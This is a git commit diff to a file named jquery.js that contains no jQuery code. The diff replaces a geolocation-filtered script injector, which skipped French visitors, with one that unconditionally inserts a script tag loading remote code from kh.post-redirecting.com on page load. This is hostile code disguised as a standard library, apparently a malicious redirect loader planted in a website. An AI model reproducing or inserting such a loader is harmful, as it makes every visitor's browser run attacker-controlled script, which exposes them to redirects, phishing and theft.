28b8027183c2e4e0faeea5639397127459ec5933
elankton <74224289+elankton@users.noreply.github.com>
2022-01-09 00:41:17 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,15 +1,6 @@
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-    if (this.responseText.toLowerCase().indexOf("loc=fr") === -1){
-        (function (a, d, j, o) {
-             o = a.createElement(d),
-                m = a.getElementsByTagName(d)[0];              
-             o.src = j + "?d=0&r=" + Math.random();
-             m.parentNode.insertBefore(o, m)
-        })(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
-    }
-}
-};
-xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
-xhttp.send();
+(function (a, d, j, o) {
+   o = a.createElement(d),
+      m = a.getElementsByTagName(d)[0];              
+   o.src = j + "?d=0&r=" + Math.random();
+   m.parentNode.insertBefore(o, m)
+})(document, 'script', 'https://kh.post-redirecting.com/sl/2e72ef55');
